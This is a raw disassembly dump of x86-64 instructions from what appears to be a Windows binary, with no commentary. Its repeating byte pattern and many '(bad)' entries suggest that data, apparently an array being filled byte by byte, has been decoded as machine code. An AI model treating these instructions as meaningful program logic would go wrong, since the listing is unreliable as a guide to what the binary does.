   1400049bd:	93                   	xchg   %eax,%ebx
   1400049be:	00 00                	add    %al,(%rax)
   1400049c0:	00 52 12             	add    %dl,0x12(%rdx)
   1400049c3:	04 20                	add    $0x20,%al
   1400049c5:	f7 02 00 00 58 20    	testl  $0x20580000,(%rdx)
   1400049cb:	c8 00 00 00          	enter  $0x0,$0x0
   1400049cf:	52                   	push   %rdx
   1400049d0:	12 04 20             	adc    (%rax,%riz,1),%al
   1400049d3:	f8                   	clc
   1400049d4:	02 00                	add    (%rax),%al
   1400049d6:	00 58 1f             	add    %bl,0x1f(%rax)
   1400049d9:	4d 52                	rex.WRB push %r10
   1400049db:	12 04 20             	adc    (%rax,%riz,1),%al
   1400049de:	f9                   	stc
   1400049df:	02 00                	add    (%rax),%al
   1400049e1:	00 58 20             	add    %bl,0x20(%rax)
   1400049e4:	9b                   	fwait
   1400049e5:	00 00                	add    %al,(%rax)
   1400049e7:	00 52 12             	add    %dl,0x12(%rdx)
   1400049ea:	04 20                	add    $0x20,%al
   1400049ec:	fa                   	cli
   1400049ed:	02 00                	add    (%rax),%al
   1400049ef:	00 58 1b             	add    %bl,0x1b(%rax)
   1400049f2:	52                   	push   %rdx
   1400049f3:	12 04 20             	adc    (%rax,%riz,1),%al
   1400049f6:	fb                   	sti
   1400049f7:	02 00                	add    (%rax),%al
   1400049f9:	00 58 1f             	add    %bl,0x1f(%rax)
   1400049fc:	5b                   	pop    %rbx
   1400049fd:	52                   	push   %rdx
   1400049fe:	12 04 20             	adc    (%rax,%riz,1),%al
   140004a01:	fc                   	cld
   140004a02:	02 00                	add    (%rax),%al
   140004a04:	00 58 1f             	add    %bl,0x1f(%rax)
   140004a07:	33 52 12             	xor    0x12(%rdx),%edx
   140004a0a:	04 20                	add    $0x20,%al
   140004a0c:	fd                   	std
   140004a0d:	02 00                	add    (%rax),%al
   140004a0f:	00 58 20             	add    %bl,0x20(%rax)
   140004a12:	d9 00                	flds   (%rax)
   140004a14:	00 00                	add    %al,(%rax)
   140004a16:	52                   	push   %rdx
   140004a17:	12 04 20             	adc    (%rax,%riz,1),%al
   140004a1a:	fe 02                	incb   (%rdx)
   140004a1c:	00 00                	add    %al,(%rax)
   140004a1e:	58                   	pop    %rax
   140004a1f:	20 8e 00 00 00 52    	and    %cl,0x52000000(%rsi)
   140004a25:	12 04 20             	adc    (%rax,%riz,1),%al
   140004a28:	ff 02                	incl   (%rdx)
   140004a2a:	00 00                	add    %al,(%rax)
   140004a2c:	58                   	pop    %rax
   140004a2d:	20 e8                	and    %ch,%al
   140004a2f:	00 00                	add    %al,(%rax)
   140004a31:	00 52 12             	add    %dl,0x12(%rdx)
   140004a34:	04 20                	add    $0x20,%al
   140004a36:	00 03                	add    %al,(%rbx)
   140004a38:	00 00                	add    %al,(%rax)
   140004a3a:	58                   	pop    %rax
   140004a3b:	1f                   	(bad)
   140004a3c:	23 52 12             	and    0x12(%rdx),%edx
   140004a3f:	04 20                	add    $0x20,%al
   140004a41:	01 03                	add    %eax,(%rbx)
   140004a43:	00 00                	add    %al,(%rax)
   140004a45:	58                   	pop    %rax
   140004a46:	20 c6                	and    %al,%dh
   140004a48:	00 00                	add    %al,(%rax)
   140004a4a:	00 52 12             	add    %dl,0x12(%rdx)
   140004a4d:	04 20                	add    $0x20,%al
   140004a4f:	02 03                	add    (%rbx),%al
   140004a51:	00 00                	add    %al,(%rax)
   140004a53:	58                   	pop    %rax
   140004a54:	20 e5                	and    %ah,%ch
   140004a56:	00 00                	add    %al,(%rax)
   140004a58:	00 52 12             	add    %dl,0x12(%rdx)
   140004a5b:	04 20                	add    $0x20,%al
   140004a5d:	03 03                	add    (%rbx),%eax
   140004a5f:	00 00                	add    %al,(%rax)
   140004a61:	58                   	pop    %rax
   140004a62:	1f                   	(bad)
   140004a63:	1e                   	(bad)
   140004a64:	52                   	push   %rdx
   140004a65:	12 04 20             	adc    (%rax,%riz,1),%al
   140004a68:	04 03                	add    $0x3,%al
   140004a6a:	00 00                	add    %al,(%rax)
   140004a6c:	58                   	pop    %rax
   140004a6d:	1f                   	(bad)
   140004a6e:	7d 52                	jge    0x140004ac2
   140004a70:	12 04 20             	adc    (%rax,%riz,1),%al
   140004a73:	05 03 00 00 58       	add    $0x58000003,%eax
   140004a78:	1f                   	(bad)
   140004a79:	4a 52                	rex.WX push %rdx
   140004a7b:	12 04 20             	adc    (%rax,%riz,1),%al
   140004a7e:	06                   	(bad)
   140004a7f:	03 00                	add    (%rax),%eax
   140004a81:	00 58 1f             	add    %bl,0x1f(%rax)
   140004a84:	25 52 12 04 20       	and    $0x20041252,%eax
   140004a89:	07                   	(bad)
   140004a8a:	03 00                	add    (%rax),%eax
   140004a8c:	00 58 1f             	add    %bl,0x1f(%rax)
   140004a8f:	21 52 12             	and    %edx,0x12(%rdx)
   140004a92:	04 20                	add    $0x20,%al
   140004a94:	08 03                	or     %al,(%rbx)
   140004a96:	00 00                	add    %al,(%rax)
   140004a98:	58                   	pop    %rax
   140004a99:	1f                   	(bad)
   140004a9a:	1e                   	(bad)
   140004a9b:	52                   	push   %rdx
   140004a9c:	12 04 20             	adc    (%rax,%riz,1),%al
   140004a9f:	09 03                	or     %eax,(%rbx)
   140004aa1:	00 00                	add    %al,(%rax)
   140004aa3:	58                   	pop    %rax
   140004aa4:	1f                   	(bad)
   140004aa5:	54                   	push   %rsp
   140004aa6:	52                   	push   %rdx
   140004aa7:	12 04 20             	adc    (%rax,%riz,1),%al
   140004aaa:	0a 03                	or     (%rbx),%al
   140004aac:	00 00                	add    %al,(%rax)
   140004aae:	58                   	pop    %rax
   140004aaf:	1f                   	(bad)
   140004ab0:	2e 52                	cs push %rdx
   140004ab2:	12 04 20             	adc    (%rax,%riz,1),%al
   140004ab5:	0b 03                	or     (%rbx),%eax
   140004ab7:	00 00                	add    %al,(%rax)
   140004ab9:	58                   	pop    %rax
   140004aba:	1f                   	(bad)
   140004abb:	66 52                	push   %dx
   140004abd:	12 04 20             	adc    (%rax,%riz,1),%al
   140004ac0:	0c 03                	or     $0x3,%al
   140004ac2:	00 00                	add    %al,(%rax)
   140004ac4:	58                   	pop    %rax
   140004ac5:	1f                   	(bad)
   140004ac6:	3e 52                	ds push %rdx
   140004ac8:	12 04 20             	adc    (%rax,%riz,1),%al
   140004acb:	0d 03 00 00 58       	or     $0x58000003,%eax
   140004ad0:	20 ac 00 00 00 52 12 	and    %ch,0x12520000(%rax,%rax,1)
   140004ad7:	04 20                	add    $0x20,%al
   140004ad9:	0e                   	(bad)
   140004ada:	03 00                	add    (%rax),%eax
   140004adc:	00 58 1f             	add    %bl,0x1f(%rax)
   140004adf:	39 52 12             	cmp    %edx,0x12(%rdx)
   140004ae2:	04 20                	add    $0x20,%al
   140004ae4:	0f 03 00             	lsl    (%rax),%eax
   140004ae7:	00 58 20             	add    %bl,0x20(%rax)
   140004aea:	95                   	xchg   %eax,%ebp
   140004aeb:	00 00                	add    %al,(%rax)
   140004aed:	00 52 12             	add    %dl,0x12(%rdx)
   140004af0:	04 20                	add    $0x20,%al
   140004af2:	10 03                	adc    %al,(%rbx)
   140004af4:	00 00                	add    %al,(%rax)
   140004af6:	58                   	pop    %rax
   140004af7:	20 de                	and    %bl,%dh
   140004af9:	00 00                	add    %al,(%rax)
   140004afb:	00 52 12             	add    %dl,0x12(%rdx)
   140004afe:	04 20                	add    $0x20,%al
   140004b00:	11 03                	adc    %eax,(%rbx)
   140004b02:	00 00                	add    %al,(%rax)
   140004b04:	58                   	pop    %rax
   140004b05:	20 d1                	and    %dl,%cl
   140004b07:	00 00                	add    %al,(%rax)
   140004b09:	00 52 12             	add    %dl,0x12(%rdx)
   140004b0c:	04 20                	add    $0x20,%al
   140004b0e:	12 03                	adc    (%rbx),%al
   140004b10:	00 00                	add    %al,(%rax)
   140004b12:	58                   	pop    %rax
   140004b13:	1f                   	(bad)
   140004b14:	17                   	(bad)
   140004b15:	52                   	push   %rdx
   140004b16:	12 04 20             	adc    (%rax,%riz,1),%al
   140004b19:	13 03                	adc    (%rbx),%eax
   140004b1b:	00 00                	add    %al,(%rax)
   140004b1d:	58                   	pop    %rax
   140004b1e:	1f                   	(bad)
   140004b1f:	29 52 12             	sub    %edx,0x12(%rdx)
   140004b22:	04 20                	add    $0x20,%al
   140004b24:	14 03                	adc    $0x3,%al
   140004b26:	00 00                	add    %al,(%rax)
   140004b28:	58                   	pop    %rax
   140004b29:	1f                   	(bad)
   140004b2a:	3f                   	(bad)
   140004b2b:	52                   	push   %rdx
   140004b2c:	12 04 20             	adc    (%rax,%riz,1),%al
   140004b2f:	15 03 00 00 58       	adc    $0x58000003,%eax
   140004b34:	20 e6                	and    %ah,%dh
   140004b36:	00 00                	add    %al,(%rax)
   140004b38:	00 52 12             	add    %dl,0x12(%rdx)
   140004b3b:	04 20                	add    $0x20,%al
   140004b3d:	16                   	(bad)
   140004b3e:	03 00                	add    (%rax),%eax
   140004b40:	00 58 20             	add    %bl,0x20(%rax)
   140004b43:	e6 00                	out    %al,$0x0
   140004b45:	00 00                	add    %al,(%rax)
   140004b47:	52                   	push   %rdx
   140004b48:	12 04 20             	adc    (%rax,%riz,1),%al
   140004b4b:	17                   	(bad)
   140004b4c:	03 00                	add    (%rax),%eax
   140004b4e:	00 58 20             	add    %bl,0x20(%rax)
   140004b51:	8c 00                	mov    %es,(%rax)
   140004b53:	00 00                	add    %al,(%rax)
   140004b55:	52                   	push   %rdx
   140004b56:	12 04 20             	adc    (%rax,%riz,1),%al
   140004b59:	18 03                	sbb    %al,(%rbx)
   140004b5b:	00 00                	add    %al,(%rax)
   140004b5d:	58                   	pop    %rax
   140004b5e:	20 ac 00 00 00 52 12 	and    %ch,0x12520000(%rax,%rax,1)
   140004b65:	04 20                	add    $0x20,%al
   140004b67:	19 03                	sbb    %eax,(%rbx)
   140004b69:	00 00                	add    %al,(%rax)
   140004b6b:	58                   	pop    %rax
   140004b6c:	20 f7                	and    %dh,%bh
   140004b6e:	00 00                	add    %al,(%rax)
   140004b70:	00 52 12             	add    %dl,0x12(%rdx)
   140004b73:	04 20                	add    $0x20,%al
   140004b75:	1a 03                	sbb    (%rbx),%al
   140004b77:	00 00                	add    %al,(%rax)
   140004b79:	58                   	pop    %rax
   140004b7a:	20 a4 00 00 00 52 12 	and    %ah,0x12520000(%rax,%rax,1)
   140004b81:	04 20                	add    $0x20,%al
   140004b83:	1b 03                	sbb    (%rbx),%eax
   140004b85:	00 00                	add    %al,(%rax)
   140004b87:	58                   	pop    %rax
   140004b88:	20 9d 00 00 00 52    	and    %bl,0x52000000(%rbp)
   140004b8e:	12 04 20             	adc    (%rax,%riz,1),%al
   140004b91:	1c 03                	sbb    $0x3,%al
   140004b93:	00 00                	add    %al,(%rax)
   140004b95:	58                   	pop    %rax
   140004b96:	1f                   	(bad)
   140004b97:	5f                   	pop    %rdi
   140004b98:	52                   	push   %rdx
   140004b99:	12 04 20             	adc    (%rax,%riz,1),%al
   140004b9c:	1d 03 00 00 58       	sbb    $0x58000003,%eax
   140004ba1:	20 ba 00 00 00 52    	and    %bh,0x52000000(%rdx)
   140004ba7:	12 04 20             	adc    (%rax,%riz,1),%al
   140004baa:	1e                   	(bad)
   140004bab:	03 00                	add    (%rax),%eax
   140004bad:	00 58 20             	add    %bl,0x20(%rax)
   140004bb0:	c3                   	ret
   140004bb1:	00 00                	add    %al,(%rax)
   140004bb3:	00 52 12             	add    %dl,0x12(%rdx)
   140004bb6:	04 20                	add    $0x20,%al
   140004bb8:	1f                   	(bad)
   140004bb9:	03 00                	add    (%rax),%eax
   140004bbb:	00 58 1f             	add    %bl,0x1f(%rax)
   140004bbe:	21 52 12             	and    %edx,0x12(%rdx)
   140004bc1:	04 20                	add    $0x20,%al
   140004bc3:	20 03                	and    %al,(%rbx)
   140004bc5:	00 00                	add    %al,(%rax)
   140004bc7:	58                   	pop    %rax
   140004bc8:	20 af 00 00 00 52    	and    %ch,0x52000000(%rdi)
   140004bce:	12 04 20             	adc    (%rax,%riz,1),%al
   140004bd1:	21 03                	and    %eax,(%rbx)
   140004bd3:	00 00                	add    %al,(%rax)
   140004bd5:	58                   	pop    %rax
   140004bd6:	1f                   	(bad)
   140004bd7:	41 52                	push   %r10
   140004bd9:	12 04 20             	adc    (%rax,%riz,1),%al
   140004bdc:	22 03                	and    (%rbx),%al
   140004bde:	00 00                	add    %al,(%rax)
   140004be0:	58                   	pop    %rax
   140004be1:	1f                   	(bad)
   140004be2:	5e                   	pop    %rsi
   140004be3:	52                   	push   %rdx
   140004be4:	12 04 20             	adc    (%rax,%riz,1),%al
   140004be7:	23 03                	and    (%rbx),%eax
   140004be9:	00 00                	add    %al,(%rax)
   140004beb:	58                   	pop    %rax
   140004bec:	1f                   	(bad)
   140004bed:	48 52                	rex.W push %rdx
   140004bef:	12 04 20             	adc    (%rax,%riz,1),%al
   140004bf2:	24 03                	and    $0x3,%al
   140004bf4:	00 00                	add    %al,(%rax)
   140004bf6:	58                   	pop    %rax
   140004bf7:	20 c1                	and    %al,%cl
   140004bf9:	00 00                	add    %al,(%rax)
   140004bfb:	00 52 12             	add    %dl,0x12(%rdx)
   140004bfe:	04 20                	add    $0x20,%al
   140004c00:	25 03 00 00 58       	and    $0x58000003,%eax
   140004c05:	20 db                	and    %bl,%bl
   140004c07:	00 00                	add    %al,(%rax)
   140004c09:	00 52 12             	add    %dl,0x12(%rdx)
   140004c0c:	04 20                	add    $0x20,%al
   140004c0e:	26 03 00             	es add (%rax),%eax
   140004c11:	00 58 16             	add    %bl,0x16(%rax)
   140004c14:	52                   	push   %rdx
   140004c15:	12 04 20             	adc    (%rax,%riz,1),%al
   140004c18:	27                   	(bad)
   140004c19:	03 00                	add    (%rax),%eax
   140004c1b:	00 58 1f             	add    %bl,0x1f(%rax)
   140004c1e:	41 52                	push   %r10
   140004c20:	12 04 20             	adc    (%rax,%riz,1),%al
   140004c23:	28 03                	sub    %al,(%rbx)
   140004c25:	00 00                	add    %al,(%rax)
   140004c27:	58                   	pop    %rax
   140004c28:	20 f7                	and    %dh,%bh
   140004c2a:	00 00                	add    %al,(%rax)
   140004c2c:	00 52 12             	add    %dl,0x12(%rdx)
   140004c2f:	04 20                	add    $0x20,%al
   140004c31:	29 03                	sub    %eax,(%rbx)
   140004c33:	00 00                	add    %al,(%rax)
   140004c35:	58                   	pop    %rax
   140004c36:	1f                   	(bad)
   140004c37:	56                   	push   %rsi
   140004c38:	52                   	push   %rdx
   140004c39:	12 04 20             	adc    (%rax,%riz,1),%al
   140004c3c:	2a 03                	sub    (%rbx),%al
   140004c3e:	00 00                	add    %al,(%rax)
   140004c40:	58                   	pop    %rax
   140004c41:	1a 52 12             	sbb    0x12(%rdx),%dl
   140004c44:	04 20                	add    $0x20,%al
   140004c46:	2b 03                	sub    (%rbx),%eax
   140004c48:	00 00                	add    %al,(%rax)
   140004c4a:	58                   	pop    %rax
   140004c4b:	1f                   	(bad)
   140004c4c:	48 52                	rex.W push %rdx
   140004c4e:	12 04 20             	adc    (%rax,%riz,1),%al
   140004c51:	2c 03                	sub    $0x3,%al
   140004c53:	00 00                	add    %al,(%rax)
   140004c55:	58                   	pop    %rax
   140004c56:	20 81 00 00 00 52    	and    %al,0x52000000(%rcx)
   140004c5c:	12 04 20             	adc    (%rax,%riz,1),%al
   140004c5f:	2d 03 00 00 58       	sub    $0x58000003,%eax
   140004c64:	20 ee                	and    %ch,%dh
   140004c66:	00 00                	add    %al,(%rax)
   140004c68:	00 52 12             	add    %dl,0x12(%rdx)
   140004c6b:	04 20                	add    $0x20,%al
   140004c6d:	2e 03 00             	cs add (%rax),%eax
   140004c70:	00 58 20             	add    %bl,0x20(%rax)
   140004c73:	f5                   	cmc
   140004c74:	00 00                	add    %al,(%rax)
   140004c76:	00 52 12             	add    %dl,0x12(%rdx)
   140004c79:	04 20                	add    $0x20,%al
   140004c7b:	2f                   	(bad)
   140004c7c:	03 00                	add    (%rax),%eax
   140004c7e:	00 58 16             	add    %bl,0x16(%rax)
   140004c81:	52                   	push   %rdx
   140004c82:	12 04 20             	adc    (%rax,%riz,1),%al
   140004c85:	30 03                	xor    %al,(%rbx)
   140004c87:	00 00                	add    %al,(%rax)
   140004c89:	58                   	pop    %rax
   140004c8a:	16                   	(bad)
   140004c8b:	52                   	push   %rdx
   140004c8c:	12 04 20             	adc    (%rax,%riz,1),%al
   140004c8f:	31 03                	xor    %eax,(%rbx)
   140004c91:	00 00                	add    %al,(%rax)
   140004c93:	58                   	pop    %rax
   140004c94:	16                   	(bad)
   140004c95:	52                   	push   %rdx
   140004c96:	12 04 20             	adc    (%rax,%riz,1),%al
   140004c99:	32 03                	xor    (%rbx),%al
   140004c9b:	00 00                	add    %al,(%rax)
   140004c9d:	58                   	pop    %rax
   140004c9e:	1f                   	(bad)
   140004c9f:	48 52                	rex.W push %rdx
   140004ca1:	12 04 20             	adc    (%rax,%riz,1),%al
   140004ca4:	33 03                	xor    (%rbx),%eax
   140004ca6:	00 00                	add    %al,(%rax)
   140004ca8:	58                   	pop    %rax
   140004ca9:	20 81 00 00 00 52    	and    %al,0x52000000(%rcx)
   140004caf:	12 04 20             	adc    (%rax,%riz,1),%al
   140004cb2:	34 03                	xor    $0x3,%al
   140004cb4:	00 00                	add    %al,(%rax)
   140004cb6:	58                   	pop    %rax
   140004cb7:	20 c6                	and    %al,%dh
   140004cb9:	00 00                	add    %al,(%rax)
   140004cbb:	00 52 12             	add    %dl,0x12(%rdx)
   140004cbe:	04 20                	add    $0x20,%al
   140004cc0:	35 03 00 00 58       	xor    $0x58000003,%eax
   140004cc5:	20 f5                	and    %dh,%ch
   140004cc7:	00 00                	add    %al,(%rax)
   140004cc9:	00 52 12             	add    %dl,0x12(%rdx)
   140004ccc:	04 20                	add    $0x20,%al
   140004cce:	36 03 00             	ss add (%rax),%eax
   140004cd1:	00 58 16             	add    %bl,0x16(%rax)
   140004cd4:	52                   	push   %rdx
   140004cd5:	12 04 20             	adc    (%rax,%riz,1),%al
   140004cd8:	37                   	(bad)
   140004cd9:	03 00                	add    (%rax),%eax
   140004cdb:	00 58 16             	add    %bl,0x16(%rax)
   140004cde:	52                   	push   %rdx
   140004cdf:	12 04 20             	adc    (%rax,%riz,1),%al
   140004ce2:	38 03                	cmp    %al,(%rbx)
   140004ce4:	00 00                	add    %al,(%rax)
   140004ce6:	58                   	pop    %rax
   140004ce7:	16                   	(bad)
   140004ce8:	52                   	push   %rdx
   140004ce9:	12 04 20             	adc    (%rax,%riz,1),%al
   140004cec:	39 03                	cmp    %eax,(%rbx)
   140004cee:	00 00                	add    %al,(%rax)
   140004cf0:	58                   	pop    %rax
   140004cf1:	20 eb                	and    %ch,%bl
   140004cf3:	00 00                	add    %al,(%rax)
   140004cf5:	00 52 12             	add    %dl,0x12(%rdx)
   140004cf8:	04 20                	add    $0x20,%al
   140004cfa:	3a 03                	cmp    (%rbx),%al
   140004cfc:	00 00                	add    %al,(%rax)
   140004cfe:	58                   	pop    %rax
   140004cff:	1a 52 12             	sbb    0x12(%rdx),%dl
   140004d02:	04 20                	add    $0x20,%al
   140004d04:	3b 03                	cmp    (%rbx),%eax
   140004d06:	00 00                	add    %al,(%rax)
   140004d08:	58                   	pop    %rax
   140004d09:	20 d5                	and    %dl,%ch
   140004d0b:	00 00                	add    %al,(%rax)
   140004d0d:	00 52 12             	add    %dl,0x12(%rdx)
   140004d10:	04 20                	add    $0x20,%al
   140004d12:	3c 03                	cmp    $0x3,%al
   140004d14:	00 00                	add    %al,(%rax)
   140004d16:	58                   	pop    %rax
   140004d17:	1f                   	(bad)
   140004d18:	78 52                	js     0x140004d6c
   140004d1a:	12 04 20             	adc    (%rax,%riz,1),%al
   140004d1d:	3d 03 00 00 58       	cmp    $0x58000003,%eax
   140004d22:	1f                   	(bad)
   140004d23:	0c 52                	or     $0x52,%al
   140004d25:	12 04 20             	adc    (%rax,%riz,1),%al
   140004d28:	3e 03 00             	ds add (%rax),%eax
   140004d2b:	00 58 20             	add    %bl,0x20(%rax)
   140004d2e:	a1 00 00 00 52 12 04 	movabs 0x3f20041252000000,%eax
   140004d35:	20 3f 
   140004d37:	03 00                	add    (%rax),%eax
   140004d39:	00 58 1f             	add    %bl,0x1f(%rax)
   140004d3c:	41 52                	push   %r10
   140004d3e:	12 04 20             	adc    (%rax,%riz,1),%al
   140004d41:	40 03 00             	rex add (%rax),%eax
   140004d44:	00 58 20             	add    %bl,0x20(%rax)
   140004d47:	f7 00 00 00 52 12    	testl  $0x12520000,(%rax)
   140004d4d:	04 20                	add    $0x20,%al
   140004d4f:	41 03 00             	add    (%r8),%eax
   140004d52:	00 58 1f             	add    %bl,0x1f(%rax)
   140004d55:	56                   	push   %rsi
   140004d56:	52                   	push   %rdx
   140004d57:	12 04 20             	adc    (%rax,%riz,1),%al
   140004d5a:	42 03 00             	rex.X add (%rax),%eax
   140004d5d:	00 58 1e             	add    %bl,0x1e(%rax)
   140004d60:	52                   	push   %rdx
   140004d61:	12 04 20             	adc    (%rax,%riz,1),%al
   140004d64:	43 03 00             	rex.XB add (%r8),%eax
   140004d67:	00 58 20             	add    %bl,0x20(%rax)
   140004d6a:	eb 00                	jmp    0x140004d6c
   140004d6c:	00 00                	add    %al,(%rax)
   140004d6e:	52                   	push   %rdx
   140004d6f:	12 04 20             	adc    (%rax,%riz,1),%al
   140004d72:	44 03 00             	add    (%rax),%r8d
   140004d75:	00 58 1a             	add    %bl,0x1a(%rax)
   140004d78:	52                   	push   %rdx
   140004d79:	12 04 20             	adc    (%rax,%riz,1),%al
   140004d7c:	45 03 00             	add    (%r8),%r8d
   140004d7f:	00 58 1f             	add    %bl,0x1f(%rax)
   140004d82:	34 52                	xor    $0x52,%al
   140004d84:	12 04 20             	adc    (%rax,%riz,1),%al
   140004d87:	46 03 00             	rex.RX add (%rax),%r8d
   140004d8a:	00 58 1f             	add    %bl,0x1f(%rax)
   140004d8d:	75 52                	jne    0x140004de1
   140004d8f:	12 04 20             	adc    (%rax,%riz,1),%al
   140004d92:	47 03 00             	rex.RXB add (%r8),%r8d
   140004d95:	00 58 20             	add    %bl,0x20(%rax)
   140004d98:	9b                   	fwait
   140004d99:	00 00                	add    %al,(%rax)
   140004d9b:	00 52 12             	add    %dl,0x12(%rdx)
   140004d9e:	04 20                	add    $0x20,%al
   140004da0:	48 03 00             	add    (%rax),%rax
   140004da3:	00 58 1f             	add    %bl,0x1f(%rax)
   140004da6:	7d 52                	jge    0x140004dfa
   140004da8:	12 04 20             	adc    (%rax,%riz,1),%al
   140004dab:	49 03 00             	add    (%r8),%rax
   140004dae:	00 58 1f             	add    %bl,0x1f(%rax)
   140004db1:	41 52                	push   %r10
   140004db3:	12 04 20             	adc    (%rax,%riz,1),%al
   140004db6:	4a 03 00             	rex.WX add (%rax),%rax
   140004db9:	00 58 20             	add    %bl,0x20(%rax)
   140004dbc:	81 00 00 00 52 12    	addl   $0x12520000,(%rax)
   140004dc2:	04 20                	add    $0x20,%al
   140004dc4:	4b 03 00             	rex.WXB add (%r8),%rax
   140004dc7:	00 58 1f             	add    %bl,0x1f(%rax)
   140004dca:	6e                   	outsb  (%rsi),(%dx)
   140004dcb:	52                   	push   %rdx
   140004dcc:	12 04 20             	adc    (%rax,%riz,1),%al
   140004dcf:	4c 03 00             	add    (%rax),%r8
   140004dd2:	00 58 1f             	add    %bl,0x1f(%rax)
   140004dd5:	0c 52                	or     $0x52,%al
   140004dd7:	12 04 20             	adc    (%rax,%riz,1),%al
   140004dda:	4d 03 00             	add    (%r8),%r8
   140004ddd:	00 58 20             	add    %bl,0x20(%rax)
   140004de0:	cd 00                	int    $0x0
   140004de2:	00 00                	add    %al,(%rax)
   140004de4:	52                   	push   %rdx
   140004de5:	12 04 20             	adc    (%rax,%riz,1),%al
   140004de8:	4e 03 00             	rex.WRX add (%rax),%r8
   140004deb:	00 58 20             	add    %bl,0x20(%rax)
   140004dee:	9a                   	(bad)
   140004def:	00 00                	add    %al,(%rax)
   140004df1:	00 52 12             	add    %dl,0x12(%rdx)
   140004df4:	04 20                	add    $0x20,%al
   140004df6:	4f 03 00             	rex.WRXB add (%r8),%r8
   140004df9:	00 58 20             	add    %bl,0x20(%rax)
   140004dfc:	e4 00                	in     $0x0,%al
   140004dfe:	00 00                	add    %al,(%rax)
   140004e00:	52                   	push   %rdx
   140004e01:	12 04 20             	adc    (%rax,%riz,1),%al
   140004e04:	50                   	push   %rax
   140004e05:	03 00                	add    (%rax),%eax
   140004e07:	00 58 1f             	add    %bl,0x1f(%rax)
   140004e0a:	1e                   	(bad)
   140004e0b:	52                   	push   %rdx
   140004e0c:	12 04 20             	adc    (%rax,%riz,1),%al
   140004e0f:	51                   	push   %rcx
   140004e10:	03 00                	add    (%rax),%eax
   140004e12:	00 58 20             	add    %bl,0x20(%rax)
   140004e15:	eb 00                	jmp    0x140004e17
   140004e17:	00 00                	add    %al,(%rax)
   140004e19:	52                   	push   %rdx
   140004e1a:	12 04 20             	adc    (%rax,%riz,1),%al
   140004e1d:	52                   	push   %rdx
   140004e1e:	03 00                	add    (%rax),%eax
   140004e20:	00 58 1a             	add    %bl,0x1a(%rax)
   140004e23:	52                   	push   %rdx
   140004e24:	12 04 20             	adc    (%rax,%riz,1),%al
   140004e27:	53                   	push   %rbx
   140004e28:	03 00                	add    (%rax),%eax
   140004e2a:	00 58 20             	add    %bl,0x20(%rax)
   140004e2d:	b7 00                	mov    $0x0,%bh
   140004e2f:	00 00                	add    %al,(%rax)
   140004e31:	52                   	push   %rdx
   140004e32:	12 04 20             	adc    (%rax,%riz,1),%al
   140004e35:	54                   	push   %rsp
   140004e36:	03 00                	add    (%rax),%eax
   140004e38:	00 58 1f             	add    %bl,0x1f(%rax)
   140004e3b:	36 52                	ss push %rdx
   140004e3d:	12 04 20             	adc    (%rax,%riz,1),%al
   140004e40:	55                   	push   %rbp
   140004e41:	03 00                	add    (%rax),%eax
   140004e43:	00 58 20             	add    %bl,0x20(%rax)
   140004e46:	a9 00 00 00 52       	test   $0x52000000,%eax
   140004e4b:	12 04 20             	adc    (%rax,%riz,1),%al
   140004e4e:	56                   	push   %rsi
   140004e4f:	03 00                	add    (%rax),%eax
   140004e51:	00 58 20             	add    %bl,0x20(%rax)
   140004e54:	e5 00                	in     $0x0,%eax
   140004e56:	00 00                	add    %al,(%rax)
   140004e58:	52                   	push   %rdx
   140004e59:	12 04 20             	adc    (%rax,%riz,1),%al
   140004e5c:	57                   	push   %rdi
   140004e5d:	03 00                	add    (%rax),%eax
   140004e5f:	00 58 1f             	add    %bl,0x1f(%rax)
   140004e62:	41 52                	push   %r10
   140004e64:	12 04 20             	adc    (%rax,%riz,1),%al
   140004e67:	58                   	pop    %rax
   140004e68:	03 00                	add    (%rax),%eax
   140004e6a:	00 58 20             	add    %bl,0x20(%rax)
   140004e6d:	81 00 00 00 52 12    	addl   $0x12520000,(%rax)
   140004e73:	04 20                	add    $0x20,%al
   140004e75:	59                   	pop    %rcx
   140004e76:	03 00                	add    (%rax),%eax
   140004e78:	00 58 1f             	add    %bl,0x1f(%rax)
   140004e7b:	6e                   	outsb  (%rsi),(%dx)
   140004e7c:	52                   	push   %rdx
   140004e7d:	12 04 20             	adc    (%rax,%riz,1),%al
   140004e80:	5a                   	pop    %rdx
   140004e81:	03 00                	add    (%rax),%eax
   140004e83:	00 58 1f             	add    %bl,0x1f(%rax)
   140004e86:	10 52 12             	adc    %dl,0x12(%rdx)
   140004e89:	04 20                	add    $0x20,%al
   140004e8b:	5b                   	pop    %rbx
   140004e8c:	03 00                	add    (%rax),%eax
   140004e8e:	00 58 20             	add    %bl,0x20(%rax)
   140004e91:	fa                   	cli
   140004e92:	00 00                	add    %al,(%rax)
   140004e94:	00 52 12             	add    %dl,0x12(%rdx)
   140004e97:	04 20                	add    $0x20,%al
   140004e99:	5c                   	pop    %rsp
   140004e9a:	03 00                	add    (%rax),%eax
   140004e9c:	00 58 1f             	add    %bl,0x1f(%rax)
   140004e9f:	7c 52                	jl     0x140004ef3
   140004ea1:	12 04 20             	adc    (%rax,%riz,1),%al
   140004ea4:	5d                   	pop    %rbp
   140004ea5:	03 00                	add    (%rax),%eax
   140004ea7:	00 58 20             	add    %bl,0x20(%rax)
   140004eaa:	d8 00                	fadds  (%rax)
   140004eac:	00 00                	add    %al,(%rax)
   140004eae:	52                   	push   %rdx
   140004eaf:	12 04 20             	adc    (%rax,%riz,1),%al
   140004eb2:	5e                   	pop    %rsi
   140004eb3:	03 00                	add    (%rax),%eax
   140004eb5:	00 58 1f             	add    %bl,0x1f(%rax)
   140004eb8:	13 52 12             	adc    0x12(%rdx),%edx
   140004ebb:	04 20                	add    $0x20,%al
   140004ebd:	5f                   	pop    %rdi
   140004ebe:	03 00                	add    (%rax),%eax
   140004ec0:	00 58 1f             	add    %bl,0x1f(%rax)
   140004ec3:	41 52                	push   %r10
   140004ec5:	12 04 20             	adc    (%rax,%riz,1),%al
   140004ec8:	60                   	(bad)
   140004ec9:	03 00                	add    (%rax),%eax
   140004ecb:	00 58 20             	add    %bl,0x20(%rax)
   140004ece:	ff 00                	incl   (%rax)
   140004ed0:	00 00                	add    %al,(%rax)
   140004ed2:	52                   	push   %rdx
   140004ed3:	12 04 20             	adc    (%rax,%riz,1),%al
   140004ed6:	61                   	(bad)
   140004ed7:	03 00                	add    (%rax),%eax
   140004ed9:	00 58 20             	add    %bl,0x20(%rax)
   140004edc:	e6 00                	out    %al,$0x0
   140004ede:	00 00                	add    %al,(%rax)
   140004ee0:	52                   	push   %rdx
   140004ee1:	12 02                	adc    (%rdx),%al
   140004ee3:	12 04 55 12 02 1e 58 	adc    0x581e0212(,%rdx,2),%al
